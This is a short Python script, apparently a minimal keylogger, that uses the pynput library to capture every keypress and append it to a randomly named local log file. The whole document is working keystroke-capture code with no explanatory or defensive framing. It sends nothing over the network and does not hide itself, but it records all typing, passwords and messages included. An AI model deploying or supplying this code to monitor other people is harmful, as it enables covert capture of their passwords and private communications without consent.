from random import randint
from pynput.keyboard import Key, Listener


output = 'LogFile' + str(randint(0, 10000)) + '.txt'  #setting the name of the log file

with open(output, 'w') as f:
    f.close()


def on_press(key):
    with open(output, 'a') as f:
        f.write('{0} pressed\n'.format(key))
        f.close()


with Listener(on_press=on_press) as listener:
    listener.join()